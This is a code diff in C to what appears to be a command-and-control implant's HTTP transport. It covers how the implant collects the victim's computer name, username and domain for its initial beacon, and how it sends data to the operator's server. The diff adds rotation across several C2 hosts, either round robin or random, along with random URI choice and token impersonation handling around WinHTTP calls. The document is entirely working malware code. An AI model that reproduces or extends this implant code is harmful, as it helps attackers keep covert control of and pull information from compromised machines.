@@ -13,11 +13,6 @@
 
 #include <iptypes.h>
 
-#define DATA_FREE( d, l ) \
-    MemSet( d, 0, l ); \
-    Instance->Win32.LocalFree( d ); \
-    d = NULL;
-
 BOOL TransportInit( PPACKAGE Package )
 {
     BOOL             Success    = FALSE;
@@ -85,7 +80,10 @@ BOOL TransportInit( PPACKAGE Package )
     if ( ! Instance->Win32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &Length ) )
     {
         if ( ( Data = Instance->Win32.LocalAlloc( LPTR, Length ) ) )
+        {
+            MemSet( Data, 0, Length );
             Instance->Win32.GetComputerNameExA( ComputerNameNetBIOS, Data, &Length );
+        }
     }
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
@@ -93,7 +91,10 @@ BOOL TransportInit( PPACKAGE Package )
     // Get Username
     Length = MAX_PATH;
     if ( ( Data = Instance->Win32.LocalAlloc( LPTR, Length ) ) )
+    {
+        MemSet( Data, 0, Length );
         Instance->Win32.GetUserNameA( Data, &Length );
+    }
 
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
@@ -103,7 +104,10 @@ BOOL TransportInit( PPACKAGE Package )
     if ( ! Instance->Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &Length ) )
     {
         if ( ( Data = Instance->Win32.LocalAlloc( LPTR, Length ) ) )
+        {
+            MemSet( Data, 0, Length );
             Instance->Win32.GetComputerNameExA( ComputerNameDnsDomain, Data, &Length );
+        }
     }
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
@@ -157,7 +161,6 @@ BOOL TransportInit( PPACKAGE Package )
     PackageAddInt32( Package, Instance->Config.Sleeping );
 
     // End of Options
-
     if ( Initialize )
     {
 #ifdef TRANSPORT_HTTP
@@ -202,19 +205,23 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     HANDLE  hSession        = NULL;
     HANDLE  hRequest        = NULL;
 
+    LPWSTR  HttpHost        = NULL;
     LPWSTR  HttpHeader      = NULL;
     LPWSTR  HttpEndpoint    = NULL;
     DWORD   HttpFlags       = 0;
     DWORD   HttpAccessType  = 0;
     LPCWSTR HttpProxy       = NULL;
 
-    DWORD   UrisCounter     = 0;
+    DWORD   Counter         = 0;
     DWORD   Iterator        = 0;
     DWORD   BufRead         = 0;
     UCHAR   Buffer[ 1024 ]  = { 0 };
     PVOID   RespBuffer      = NULL;
     SIZE_T  RespSize        = 0;
     BOOL    Successful      = TRUE;
+
+    /* we might impersonate a token that lets WinHttpOpen return an Error 5 (ERROR_ACCESS_DENIED) */
+    TokenImpersonate( FALSE );
 
     if ( Instance->Config.Transport.Proxy.Enabled )
     {
@@ -231,30 +238,50 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
         goto LEAVE;
     }
 
-    hConnect = Instance->Win32.WinHttpConnect( hSession, Instance->Config.Transport.Host, Instance->Config.Transport.Port, 0 );
+    if ( Instance->Config.Transport.HostRotation == TRANSPORT_HTTP_ROTATION_ROUND_ROBIN )
+    {
+        HttpHost = Instance->Config.Transport.Hosts[ Instance->Config.Transport.HostIndex ];
+        if ( HttpHost )
+            Instance->Config.Transport.HostIndex++;
+        else
+        {
+            // We hit the last item which is a NULL. means we have to start all over from 0.
+            Instance->Config.Transport.HostIndex = 0;
+            HttpHost = Instance->Config.Transport.Hosts[ Instance->Config.Transport.HostIndex ];
+        }
+    }
+    else if ( Instance->Config.Transport.HostRotation == TRANSPORT_HTTP_ROTATION_RANDOM )
+    {
+        while ( TRUE )
+        {
+            if ( ! Instance->Config.Transport.Hosts[ Counter ] ) break;
+            else Counter++;
+        }
+
+        HttpHost = Instance->Config.Transport.Hosts[ RandomNumber32() % Counter ];
+    }
+
+    hConnect = Instance->Win32.WinHttpConnect( hSession, HttpHost, Instance->Config.Transport.Port, 0 );
     if ( ! hConnect )
     {
         PRINTF( "WinHttpConnect: Failed => %d\n", NtGetLastError() )
-
         Successful = FALSE;
         goto LEAVE;
     }
 
+    Counter = 0;
     while ( TRUE )
     {
-        if ( ! Instance->Config.Transport.Uris[ UrisCounter ] )
-            break;
-        else
-            UrisCounter++;
+        if ( ! Instance->Config.Transport.Uris[ Counter ] ) break;
+        else Counter++;
     }
 
-    HttpEndpoint = Instance->Config.Transport.Uris[ RandomNumber32() % UrisCounter ];
+    HttpEndpoint = Instance->Config.Transport.Uris[ RandomNumber32() % Counter ];
     HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
 
     if ( Instance->Config.Transport.Secure )
         HttpFlags |= WINHTTP_FLAG_SECURE;
 
-    // PRINTF( "WinHttpOpenRequest( %x, %ls, %ls, NULL, NULL, NULL, %d )\n", hConnect, Instance->Config.Transport.Method, HttpEndpoint, HttpFlags )
     hRequest = Instance->Win32.WinHttpOpenRequest( hConnect, Instance->Config.Transport.Method, HttpEndpoint, NULL, NULL, NULL, HttpFlags );
     if ( ! hRequest )
     {
@@ -368,6 +395,9 @@ LEAVE:
     Instance->Win32.WinHttpCloseHandle( hSession );
     Instance->Win32.WinHttpCloseHandle( hConnect );
     Instance->Win32.WinHttpCloseHandle( hRequest );
+
+    /* re-impersonate the token */
+    TokenImpersonate( TRUE );
 
     return Successful;
 #endif
